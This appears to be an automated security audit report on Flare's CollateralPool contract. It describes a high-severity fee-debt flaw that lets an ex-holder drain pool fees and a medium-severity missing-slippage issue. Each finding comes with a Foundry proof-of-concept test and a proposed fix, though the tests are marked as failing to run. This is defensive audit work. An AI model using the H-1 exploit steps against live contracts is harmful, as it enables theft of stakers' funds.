# 2025 08 flare - Findings Report
## Commit hash: 7bcf1437ddd739a15f8aa1b588fcc17eb66d2f31

##Findings by Pattern


 **Derived From** : Exit can make fee debt negative, letting exiter steal pool fees

[H-1]. CollateralPool exit makes fee-debt negative; ex‑holder can withdraw fees after burning all pool tokens
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : Self-close exit computes required FAssets from live price; no user floor

[M-2]. Missing slippage bounds in CollateralPool.selfCloseExit/selfCloseExitTo lets price/oracle updates make users burn extra FAssets or revert
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 1
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Exit can make fee debt negative, letting exiter steal pool fees

## [H-1]. CollateralPool exit makes fee-debt negative; ex‑holder can withdraw fees after burning all pool tokens

### Finding Severity Justification: A user can extract real FAsset fees from the pool after fully exiting, without holding any pool tokens, by first paying their fee debt and then exiting. The accounting in exitTo()/_selfCloseExitTo() reduces the caller’s fee-debt by their pro‑rata share of current virtual fees without clamping, which can drive their fee-debt negative. Since withdrawFees() computes entitlement as positivePart(virtualFeesOf(account) − accountDebt), a negative debt with zero tokens becomes a positive claim. This enables permissionless theft of pool fees. The effect can reach a large portion (up to all) of existing pool fees depending on the share exited, so asset impact is high.
## Derived From Pattern/Invariant
Exit can make fee debt negative, letting exiter steal pool fees

## Exploit Type
AccountingInvariantViolation

## Location
CollateralPool.exitTo

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In CollateralPool._exitTo, the caller’s fee debt is always reduced by their pro‑rata share of current virtual fees: 

uint256 debtFAssetFeeShare = _tokensToVirtualFeeShare(_tokenShare);
_deleteFAssetFeeDebt(msg.sender, debtFAssetFeeShare);

No clamping is applied to the account’s current debt. If the user first zeroes their debt via payFAssetFeeDebt(), then exits, the subtraction drives _fAssetFeeDebtOf[account] negative. Later, withdrawFees() computes free fees as positivePart(virtualFeesOf(account) − accountDebt). With zero tokens, virtualFeesOf(account)=0, but a negative debt turns the expression positive, so _fAssetFeesOf returns > 0 and withdrawFees succeeds even though token balance is 0. This breaks the accounting invariant that a zero‑token account must not have fee entitlement. Vulnerable snippets:

- CollateralPool._exitTo:
  uint256 debtFAssetFeeShare = _tokensToVirtualFeeShare(_tokenShare);
  _deleteFAssetFeeDebt(msg.sender, debtFAssetFeeShare);

- CollateralPool._fAssetFeesOf:
  int256 userFees = int(virtual) - accountDebt; 
  return Math.min(MathUtils.positivePart(userFees), totalFAssetFees);

The result is that an ex‑holder can withdraw FAssets (from totalFAssetFees) after burning their pool tokens. This is an accounting invariant violation.

## Impact
A user can fully exit the pool and then withdraw real FAssets while holding zero pool tokens by exiting when their fee-debt is less than the pro‑rata virtual fees (including the common case of initial debt = 0). During exit, the contract unconditionally subtracts the virtual-fee share from the account’s debt, which can drive the debt negative. Because withdrawFees() uses max(0, virtualFeesOf(account) − accountDebt), negative debt with zero tokens yields a positive entitlement. This allows ex‑holders to steal up to their entire pro‑rata share of current pool fees (and with a sole staker scenario, up to all fees), directly reducing fees available to current stakers. Severity: High.

## Command to Run Test


## Proof of Concept
Attack steps (no need to have initial positive fee-debt):
1) Seed the pool with nonzero FAsset fees and mint those FAssets to the pool address so the pool can pay withdrawals.
2) Attacker enters the pool as the first (or any) staker; their initial fee-debt is 0 if they are first.
3) Attacker fully exits via exitTo(); exit logic subtracts their pro‑rata share of virtual fees from their fee-debt, making it negative (since it was 0).
4) With zero pool tokens, virtualFeesOf(attacker)=0, but accountDebt is negative, so fAssetFeesOf(attacker) = positivePart(0 − (negative)) > 0.
5) Attacker calls withdrawFees() for that amount and receives FAssets from the pool despite holding no pool tokens, draining existing pool fees.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";
import {AssetManagerMock} from "contracts/assetManager/implementation/mock/AssetManagerMock.sol";
import {WNatMock} from "contracts/flareSmartContracts/implementation/WNatMock.sol";
import {FAsset} from "contracts/fassetToken/implementation/FAsset.sol";

contract NegativeDebtExitTest is Test {
    CollateralPool pool;
    CollateralPoolToken poolToken;
    AssetManagerMock am;
    WNatMock wnat;
    FAsset fasset;

    address agentVault = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy mocks and AM
        wnat = new WNatMock(address(0), "WNat", "WNAT");
        am = new AssetManagerMock(wnat);
        am.setCheckForValidAgentVaultAddress(false);

        // Deploy FAsset and register AM
        fasset = new FAsset();
        fasset.initialize("FXRP", "FXRP", "XRP", "XRP", 18);
        fasset.setAssetManager(address(am));
        am.registerFAssetForCollateralPool(fasset);

        // Deploy pool and token; set token via AM
        pool = new CollateralPool(agentVault, address(am), address(fasset), uint32(15000));
        poolToken = new CollateralPoolToken(address(pool), "CPT", "CPT");
        am.callFunctionAt(address(pool), abi.encodeWithSignature("setPoolToken(address)", address(poolToken)));

        // Seed pool with FAsset fees: mint tokens to pool AND update accounting
        uint256 initialFees = 1e18; // 1 FAsset
        am.callFunctionAt(address(fasset), abi.encodeWithSignature("mint(address,uint256)", address(pool), initialFees));
        am.callFunctionAt(address(pool), abi.encodeWithSignature("fAssetFeeDeposited(uint256)", initialFees));

        vm.deal(attacker, 10 ether);
    }

    function test_NegativeDebtWithdrawAfterExit() public {
        uint256 initialFees = pool.totalFAssetFees();
        assertGt(initialFees, 0);
        assertEq(fasset.balanceOf(address(pool)), initialFees, "pool must hold fassets");

        // Attacker enters pool (as the first staker -> initial debt = 0)
        vm.startPrank(attacker);
        pool.enter{value: 1 ether}();
        int256 debtBeforeExit = pool.fAssetFeeDebtOf(attacker);
        assertEq(debtBeforeExit, 0, "first entrant has zero initial debt");

        // Fully exit: subtracts pro‑rata virtual fees from debt, pushing it negative
        uint256 attackerTokens = poolToken.balanceOf(attacker);
        pool.exitTo(attackerTokens, payable(attacker));
        vm.stopPrank();

        assertEq(poolToken.balanceOf(attacker), 0, "all pool tokens burned");
        int256 debtAfterExit = pool.fAssetFeeDebtOf(attacker);
        assertLt(debtAfterExit, 0, "debt became negative after exit");

        // With zero tokens, negative debt yields positive withdrawable fees
        uint256 withdrawable = pool.fAssetFeesOf(attacker);
        assertGt(withdrawable, 0, "withdrawable fees must be > 0");
        assertEq(withdrawable, uint256(-debtAfterExit), "withdraw equals abs(negative debt)");
        assertLe(withdrawable, initialFees, "cannot exceed total pool fees");

        // Withdraw fees; attacker receives FAssets from pool despite 0 tokens
        uint256 fBefore = fasset.balanceOf(attacker);
        vm.startPrank(attacker);
        pool.withdrawFees(withdrawable);
        vm.stopPrank();

        uint256 fAfter = fasset.balanceOf(attacker);
        assertEq(fAfter - fBefore, withdrawable, "attacker withdrew fees with 0 tokens");
        assertEq(pool.totalFAssetFees(), initialFees - withdrawable, "pool fees reduced");
    }
}


## Suggested Mitigation
Clamp fee-debt reduction on exit/selfCloseExit to the caller’s current debt so it never becomes negative. For example:

- In _exitTo and _selfCloseExitTo, replace:
  _deleteFAssetFeeDebt(msg.sender, debtFAssetFeeShare);

  with:
  {
    int256 cur = _fAssetFeeDebtOf[msg.sender];
    uint256 reduce = cur > 0 ? Math.min(uint256(cur), debtFAssetFeeShare) : 0;
    _deleteFAssetFeeDebt(msg.sender, reduce);
  }

This preserves the intended pro‑rata debt reduction for indebted accounts while preventing negative debt creation for accounts with low/zero debt.

Additionally (defense-in-depth):
- In withdrawFees/withdrawFeesTo, require that either token.balanceOf(account) > 0 or accountDebt >= 0 (e.g., forbid fee withdrawals for zero-token accounts or those with negative debt). This blocks any residual path for ex‑holders to claim fees.

Consider documenting that clamping changes virtual-fees dynamics (total virtual fees may not reduce exactly by pro‑rata on exits with under‑indebted accounts) but maintains safety invariants and closes the theft vector.





 **Derived From** : Self-close exit computes required FAssets from live price; no user floor

## [M-2]. Missing slippage bounds in CollateralPool.selfCloseExit/selfCloseExitTo lets price/oracle updates make users burn extra FAssets or revert

### Finding Severity Justification: selfCloseExit/selfCloseExitTo recompute the required FAssets to burn at execution time from live price and pool state without any user-specified maximum or deadline. If the oracle price or pool CR changes between preview and inclusion, the function can pull and burn more FAssets than the user intended (given a high/∞ allowance), or revert after the user pays gas if allowance matches the preview. This is a standard missing-slippage-bound risk on a user-facing path that transfers tokens based on volatile inputs, leading to potential material user loss.
## Derived From Pattern/Invariant
Self-close exit computes required FAssets from live price; no user floor

## Exploit Type
SlippageMissingOrInsufficient

## Location
CollateralPool.selfCloseExitTo

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
selfCloseExit/selfCloseExitTo determine the f-assets to burn at execution time from the current oracle price and pool state, without any user-specified cap or deadline. Any price move between preview/approval and inclusion (or an oracle update in the same block) increases requiredFAssets unexpectedly, either forcing users to burn more f-assets than intended (if they have a large allowance) or reverting after they paid gas (if allowance matches the preview). Vulnerable code:

- CollateralPool._selfCloseExitTo:
  uint256 natShare = totalCollateral.mulDiv(_tokenShare, token.totalSupply());
  uint256 requiredFAssets = _getFAssetRequiredToNotSpoilCR(natShare);
  require(fAsset.allowance(msg.sender, address(this)) >= requiredFAssets, FAssetAllowanceTooSmall());
  fAsset.safeTransferFrom(msg.sender, address(this), requiredFAssets);

- _getFAssetRequiredToNotSpoilCR() uses live assetManager.assetPriceNatWei() and pool CR with no max parameter or deadline.

A price increase raises requiredFAssets (denominator p*CR larger -> smaller permitted backing, so the delta increases). There is no min/max or deadline to protect users against MEV/oracle update slippage.

## Impact
If the asset price or pool state changes between preview and execution, selfCloseExit/selfCloseExitTo recompute requiredFAssets and can either pull and burn more FAssets than the user intended (when allowance is large) or revert with FAssetAllowanceTooSmall after the user spends gas (when allowance matches preview). The loss is bounded by the user’s fAsset balance and allowance, but can still be material and unexpected.

## Command to Run Test


## Proof of Concept
Scenario: A user previews required f-assets for selfCloseExit on a given pool share. With initial price and pool state configured so the preview returns 0, the user approves exactly 0 or sets a very high allowance. Before inclusion, the oracle price increases. At execution, the contract recomputes requiredFAssets from the new price and either: (a) reverts due to insufficient allowance (gas lost), or (b) pulls/burns additional f-assets due to the high allowance (unexpected loss). Steps:
1) User calls fAssetRequiredForSelfCloseExit(share) and gets 0.
2) User approves 0 (tight) or a large allowance for fAsset to the pool.
3) Oracle price increases (e.g., from 1 to 2 NAT per f-asset) prior to transaction inclusion.
4) selfCloseExitTo recomputes requiredFAssets > 0 and:
   - With exact (0) allowance: reverts with FAssetAllowanceTooSmall after spending gas.
   - With high allowance: pulls and burns > 0 f-assets even though preview was 0.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";
import {FAsset} from "contracts/fassetToken/implementation/FAsset.sol";
import {AssetManagerMock} from "contracts/assetManager/facets/AssetManagerMock.sol";
import {WNatMock} from "contracts/flareSmartContracts/implementation/WNatMock.sol";
import {IWNat} from "contracts/flareSmartContracts/interfaces/IWNat.sol";

contract SelfCloseExitSlippageTest is Test {
    CollateralPool pool;
    CollateralPoolToken poolToken;
    FAsset fasset;
    AssetManagerMock am;
    WNatMock wnat;
    address agentVault = address(0xA11CE);
    address alice = address(0xBEEF);

    function setUp() public {
        // Deploy WNat and AssetManager mock
        wnat = new WNatMock(address(0), "Wrapped NAT", "WNAT");
        am = new AssetManagerMock(IWNat(address(wnat)));
        // Allow pool.enter() -> AssetManagerMock.updateCollateral()
        am.setCheckForValidAgentVaultAddress(false);

        // Deploy FAsset and wire to AssetManager
        fasset = new FAsset();
        fasset.initialize("FXRP", "FXRP", "XRP", "XRP", 18);
        fasset.setAssetManager(address(am));
        am.registerFAssetForCollateralPool(fasset);

        // Deploy pool and token
        pool = new CollateralPool(agentVault, address(am), address(fasset), uint32(12000)); // exit CR = 1.2x
        poolToken = new CollateralPoolToken(address(pool), "CPT", "CPT");
        vm.prank(address(am));
        pool.setPoolToken(address(poolToken));

        // Initial price and balances
        vm.deal(alice, 200 ether);
        am.setAssetPriceNatWei(1, 1); // price = 1 NAT per f-asset

        // Alice enters with 100 NAT -> receives pool tokens
        vm.startPrank(alice);
        pool.enter{value: 100 ether}();
        vm.stopPrank();

        // Give Alice f-assets to cover potential self-close burn
        vm.prank(address(am));
        fasset.mint(alice, 1000 ether);

        // Set pool-backed f-assets so that preview at old price is 0 for half share (see math in analysis)
        // With N=100, exitCR=1.2, n=50, F<=41.66 -> required=0. Choose 40 ether.
        am.setFAssetsBackedByPool(40 ether);
    }

    // If price rises after preview/approval, tx reverts (allowance too small)
    function test_Slippage_RevertsOnPriceJumpWithExactAllowance() public {
        vm.startPrank(alice);
        uint256 halfShare = poolToken.balanceOf(alice) / 2;
        uint256 expected = pool.fAssetRequiredForSelfCloseExit(halfShare);
        assertEq(expected, 0, "expected zero f-assets at initial price for this share");
        // Approve exactly the previewed amount (0)
        fasset.approve(address(pool), expected);
        vm.stopPrank();

        // Oracle/price update: p -> 2
        am.setAssetPriceNatWei(2, 1);

        vm.startPrank(alice);
        vm.expectRevert(CollateralPool.FAssetAllowanceTooSmall.selector);
        pool.selfCloseExitTo(halfShare, true, payable(alice), "r", payable(address(0)));
        vm.stopPrank();
    }

    // With large allowance, user burns more FAssets than previewed (slippage loss)
    function test_Slippage_BurnsMoreOnPriceJumpWithHighAllowance() public {
        vm.startPrank(alice);
        uint256 halfShare = poolToken.balanceOf(alice) / 2;
        uint256 expected = pool.fAssetRequiredForSelfCloseExit(halfShare);
        assertEq(expected, 0, "expected zero f-assets at initial price for this share");
        // Approve huge amount
        fasset.approve(address(pool), type(uint256).max);
        uint256 balBefore = fasset.balanceOf(alice);
        vm.stopPrank();

        // Price jumps
        am.setAssetPriceNatWei(2, 1);

        vm.startPrank(alice);
        pool.selfCloseExitTo(halfShare, true, payable(alice), "r", payable(address(0)));
        vm.stopPrank();

        uint256 balAfter = fasset.balanceOf(alice);
        uint256 spent = balBefore - balAfter;
        assertGt(spent, expected, "spent more f-assets than previewed (slippage)");
    }
}


## Suggested Mitigation
Add user-controlled slippage and time-bounds to selfCloseExit/selfCloseExitTo. For example, introduce an overload that requires both a maximum acceptable f-asset burn and an expiry:

function selfCloseExitTo(
    uint256 tokenShare,
    bool redeemToCollateral,
    address payable recipient,
    string memory redeemerUnderlyingAddress,
    address payable executor,
    uint256 maxRequiredFAssets,
    uint256 deadline
) external payable nonReentrant {
    require(block.timestamp <= deadline, "expired");
    ...
    uint256 required = _getFAssetRequiredToNotSpoilCR(natShare);
    require(required <= maxRequiredFAssets, "slippage");
    ...
}

Keep the existing function for backward compatibility, or deprecate it in front-ends and prefer the new overload. Optionally, add a minNatOut parameter to ensure the NAT share aligns with user expectations, and support EIP-2612 permit for fAsset to avoid wide allowances.



